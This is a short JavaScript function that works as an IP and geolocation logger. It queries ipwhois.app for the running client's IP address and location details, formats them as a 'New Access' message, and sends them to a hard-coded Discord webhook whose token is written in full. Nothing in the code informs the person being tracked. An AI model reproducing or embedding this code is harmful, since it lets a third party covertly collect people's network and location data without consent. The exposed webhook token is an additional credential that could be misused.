function req () {
  const get = {
    url:'https://ipwhois.app/json/',
    method:'GET'
  }
  axios(get).then(res => {
    var content = '**__New Access__**\n\n';
    function capitalize (str) {
      if(!str[0]) return str;
      else return str[0].toUpperCase()+str.slice(1,);
    }
    for (entry in res.data) {
      content+='**'+capitalize(entry)+'** : `\u200b'+capitalize(res.data[entry])+'`\n'
    }
    const post = {
      url:'https://discord.com/api/webhooks/868378650733604884/jJmuEoSnQBT_4l78p7BzUsNVFwU1DfBv5GuXar6Bms6vR4yLOjInVTb-nBwN4NKKuAvJ',
      method:'POST',
      data:{
        "content":content,
      },
      headers:{
        'content-type':'application/json'
      }
    }
    axios(post);
  })
}
